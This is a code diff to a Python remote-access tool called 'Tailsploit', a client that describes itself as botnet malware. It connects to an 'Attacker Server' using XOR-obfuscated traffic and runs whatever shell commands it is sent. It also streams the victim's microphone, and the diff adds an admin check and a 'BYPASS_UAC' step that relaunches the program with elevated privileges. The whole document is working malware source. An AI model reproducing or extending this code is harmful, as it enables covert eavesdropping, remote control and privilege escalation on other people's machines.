@@ -13,7 +13,6 @@ FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
 
-# Define the server IP and port
 SERVER_IP = "127.0.0.1"
 SERVER_PORT = 5050
 TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'
@@ -42,28 +41,34 @@ class TailsploitClient:
             if not self.audio_stop_event.is_set():
                 self.audio_stopped = True
 
+    def is_admin(self):
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception as e:
+            return False
+
     def InitializingTailsploitConnection(self):
         try:
+            IsBypassUAC = "False"
+            DesktopName = "ww"
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((SERVER_IP, SERVER_PORT))
-            connection_flag = "REGULAR_CLIENT_FLAGS"
+            connection_flag = f"--FLAG:CLIENT_PAYLOAD::{IsBypassUAC}::{DesktopName}"
             connection_flag_xor = handleXOREncryption(connection_flag.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN)
             client_socket.send(connection_flag_xor)
+            print("Flag sended")
             while True:
-                    print("COMMAND")
+                    print("Connected to Tailsploit's Attacker Server.")
                     command = client_socket.recv(4096)
                     commandDecode = handleXOREncryption(command, TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
-                    print()
-                    print(f"{commandDecode}")
 
                     if commandDecode == "REVERSE_SHELL_THREAD=ISALIVE?":
                         client_socket.send("REVERSE_SHELL_THREAD=ISALIVE?TRUE".encode("utf-8"))
-                        print("Replied")
                     
                     elif commandDecode == "LISTENING_MICROPHONE":
                         if not self.audio_thread or self.audio_stopped:
                             print("[*] Listening to the microphone...")
-                            self.audio_stopped = False  # Reset the flag
+                            self.audio_stopped = False
                             self.audio_stop_event.clear()
                             self.audio_thread = threading.Thread(target=self.handle_microphone, args=(client_socket,))
                             self.audio_thread.start()
@@ -78,7 +83,23 @@ class TailsploitClient:
                             self.audio_stopped = True
                         else:
                             print("[*] Microphone is not being listened to.")
-
+                    
+                    elif commandDecode == "IS_ADMIN":
+                        if self.is_admin():
+                            client_socket.send("--FLAG:UAP=TRUE".encode("utf-8"))
+                        else:
+                            client_socket.send("--FLAG:UAP=FALSE".encode("utf-8"))
+                    elif commandDecode == "BYPASS_UAC":
+                        if self.is_admin():
+                            client_socket.send("--FLAG:UAC_BYPASS_ALRDY".encode("utf-8"))
+                        else:
+                            try:
+                                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                                client_socket.send("--FLAG:UAC_BYPASS_ATTEMPT".encode("utf-8"))
+                                os._exit(0)
+                            except Exception as e:
+                                print(f"Failed to run as admin: {e}")
+                                return False
                     else:
                         try:
                             output = subprocess.check_output(commandDecode, shell=True, stderr=subprocess.STDOUT, text=True)
